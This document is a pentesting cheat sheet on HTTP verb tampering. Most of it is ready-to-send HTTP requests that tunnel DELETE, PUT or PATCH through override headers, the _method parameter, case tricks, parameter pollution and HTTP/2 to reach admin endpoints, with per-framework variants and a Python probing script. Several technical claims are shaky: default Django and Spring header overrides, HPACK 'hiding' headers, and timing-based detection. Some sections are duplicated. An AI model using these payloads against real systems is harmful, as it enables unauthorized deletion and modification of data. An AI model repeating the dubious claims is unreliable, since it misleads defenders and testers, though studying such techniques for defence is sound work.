### HTTP Verb Tampering Vulnerability

HTTP Verb Tampering (or HTTP Method Tampering) is a security flaw where an application's access control mechanisms are inconsistent across different HTTP methods, allowing an attacker to bypass authorization by using an alternative verb.

* **Vulnerability Type:** Broken Access Control / Inconsistent Security Policy
* **Impact:** Unauthorized actions (data deletion, modification, or elevated access) on restricted resources
* **Root Cause:** A discrepancy in how security layers (WAFs, load balancers, web servers, and application frameworks) validate and interpret the HTTP method of a single request

-----

### Basic Verb Tampering Techniques

#### Method Override Headers (Header Tunneling)

```http
POST /api/users/101 HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
Content-Type: application/json
Content-Length: 15

{"status":"active"}
```

* **Why it's used:** To bypass method-based access controls by tunneling restricted methods through allowed ones.
* **How it works:** Framework middleware processes override headers before application-level security checks.

#### Parameter-Based Override

```http
POST /api/documents/99 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

_method=DELETE
```

* **Why it's used:** Exploits framework method override features intended for HTML form compatibility.
* **How it works:** Framework routing uses parameter values instead of actual HTTP methods.

#### Case Manipulation (HTTP Method Smuggling)

```http
dElEtE /admin/reset HTTP/1.1
Host: vulnerable.com
Content-Length: 0
```

* **Why it's used:** Bypasses case-sensitive security filters while backend processes the request.
* **How it works:** Web servers often normalize method names while WAFs may do exact string matching.

-----

### Advanced Exploitation and Framework Specifics

#### Framework-Specific Overrides

```http
POST /api/items/1 HTTP/1.1
Host: rails-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

_method=DELETE&authenticity_token=abc123xyz
```

* **Why it's used:** Framework-specific override mechanisms that bypass method restrictions.
* **How it works:** Authenticity tokens protect against CSRF but not method tampering.

#### Protocol-Level Manipulation (HTTP/2 Method Smuggling)

```http
:method = POST
:path = /admin/delete-user/10
x-http-method-override = DELETE
content-type = application/json
```

* **Why it's used:** Exploits protocol translation inconsistencies between components.
* **How it works:** Frontend processes see allowed methods while backend processes overrides.

#### Parameter Pollution

```http
POST /admin/users/123 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

_method=GET&_method=DELETE&method=PATCH&id=123
```

* **Why it's used:** Exploits how frameworks handle duplicate parameters.
* **How it works:** Many frameworks use the last parameter value, allowing method override.

-----

### Advanced Attack Scenarios

#### Bypassing Web Application Firewalls (WAF)

```http
POST /api/admin/users HTTP/1.1
Host: target.com
X-HTTP-Method: GET
X-Method-Override: PUT
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{"action":"delete","user_id":101}
```

* **Why it's used:** WAF sees POST method (allowed) while backend processes last override header (DELETE).
* **How it works:** Attack executes despite WAF protection due to inconsistent method parsing.

#### Combining with IDOR Attacks

```http
POST /api/users/505/profile HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
Content-Type: application/json

{"user_id":506}
```

* **Why it's used:** Double bypass - method restrictions and access controls.
* **How it works:** Changes method to read data while manipulating object references.

#### Time-Based Method Detection

```python
import requests
import time

methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
override_headers = ['X-HTTP-Method-Override', 'X-Method-Override', 'X-HTTP-Method']

def detect_methods(url):
    for method in methods:
        # Test direct method
        start = time.time()
        response = requests.request(method, url)
        direct_time = time.time() - start
        
        # Test override
        for header in override_headers:
            start = time.time()
            response = requests.post(url, headers={header: method})
            override_time = time.time() - start
            
            if response.status_code != 405 and abs(direct_time - override_time) < 0.1:
                print(f"Method {method} accessible via {header}")
```

* **Why it's used:** To detect which HTTP methods are accessible via override techniques.
* **How it works:** Compares response times between direct method calls and override-based calls.

-----

### Framework-Specific Method Override Techniques

Different web frameworks handle HTTP method overrides in unique ways, creating specific attack vectors.

#### Ruby on Rails Method Override

```http
POST /users/123 HTTP/1.1
Host: rails-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

_method=DELETE&authenticity_token=abc123xyz
```

* **Why it's used:** Rails uses `_method` parameter for RESTful routing in forms.
* **How it works:** The framework checks the `_method` parameter and routes accordingly, bypassing method restrictions.

#### Django Method Override

```http
POST /api/users/456 HTTP/1.1
Host: django-app.com
X-HTTP-Method-Override: PATCH
Content-Type: application/json

{"name": "Updated Name"}
```

* **Why it's used:** Django supports method override headers for API compatibility.
* **How it works:** Middleware processes override headers before view dispatch.

#### Laravel Method Override

```http
POST /users/789 HTTP/1.1
Host: laravel-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

_method=PUT&_token=csrf_token_here
```

* **Why it's used:** Laravel uses `_method` for form-based method spoofing.
* **How it works:** Framework routing honors the `_method` parameter for form submissions.

#### Express.js Method Override

```http
POST /api/items/101 HTTP/1.1
Host: express-app.com
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{"confirm": true}
```

* **Why it's used:** Express middleware can be configured to accept method overrides.
* **How it works:** Custom middleware or third-party packages process override headers.

#### ASP.NET MVC Method Override

```http
POST /Account/ChangePassword HTTP/1.1
Host: aspnet-app.com
X-HTTP-Method-Override: PUT
Content-Type: application/x-www-form-urlencoded

OldPassword=old&NewPassword=new&ConfirmPassword=new
```

* **Why it's used:** ASP.NET supports method override for REST API compatibility.
* **How it works:** Framework routing uses override headers for method determination.

#### Spring Boot Method Override

```http
POST /api/users/202 HTTP/1.1
Host: spring-app.com
X-HTTP-Method-Override: PATCH
Content-Type: application/json

{"status": "inactive"}
```

* **Why it's used:** Spring MVC supports method override headers.
* **How it works:** Handler mapping considers override headers for method resolution.

#### Flask Method Override

```http
POST /admin/reset HTTP/1.1
Host: flask-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

_method=DELETE&confirm=yes
```

* **Why it's used:** Flask extensions provide method override functionality.
* **How it works:** Extensions like Flask-MethodOverride process override parameters.

#### Symfony Method Override

```http
POST /users/303 HTTP/1.1
Host: symfony-app.com
X-HTTP-Method-Override: PUT
Content-Type: application/json

{"email": "new@email.com"}
```

* **Why it's used:** Symfony supports method override for form handling.
* **How it works:** Framework routing honors override headers in request processing.

#### CodeIgniter Method Override

```http
POST /users/update/404 HTTP/1.1
Host: ci-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

_method=PATCH&name=UpdatedName
```

* **Why it's used:** CodeIgniter uses `_method` for RESTful routing.
* **How it works:** Input class processes method override parameters.

#### CakePHP Method Override

```http
POST /posts/edit/505 HTTP/1.1
Host: cakephp-app.com
X-HTTP-Method-Override: PUT
Content-Type: application/x-www-form-urlencoded

_method=PUT&title=NewTitle&body=NewContent
```

* **Why it's used:** CakePHP supports multiple override mechanisms.
* **How it works:** Request handler processes both headers and parameters for method override.

-----

### HTTP/2 and Advanced Protocol Attacks

HTTP/2 introduces new attack surfaces for method tampering due to its binary nature and multiplexing features.

#### HTTP/2 Method Smuggling

```http
:method = POST
:path = /admin/delete
:authority = target.com
x-http-method-override = DELETE
content-type = application/json

{"user_id": 123}
```

* **Why it's used:** Exploits differences in HTTP/2 to HTTP/1.1 translation between components.
* **How it works:** Frontend proxy sees POST while backend application processes DELETE override.

#### HTTP/2 Header Compression Attacks

* Using HPACK compression to hide override headers:

```http
:method = POST
:path = /api/users
:authority = target.com
x-http-method-override = DELETE
x-custom-header = value
```

* **Why it's used:** HPACK compression can mask header manipulation.
* **How it works:** Compressed headers may not be inspected properly by security controls.

#### HTTP/2 Stream Multiplexing

* Stream 1: Legitimate request

```http
:method = GET
:path = /api/public
:authority = target.com
```

* Stream 2: Tampered request

```http
:method = POST
:path = /admin/reset
:authority = target.com
x-http-method-override = PUT
```

* **Why it's used:** Multiple concurrent streams can bypass rate limiting and detection.
* **How it works:** Security controls may not correlate requests across different streams.

-----

**Made with love by VIsh0k**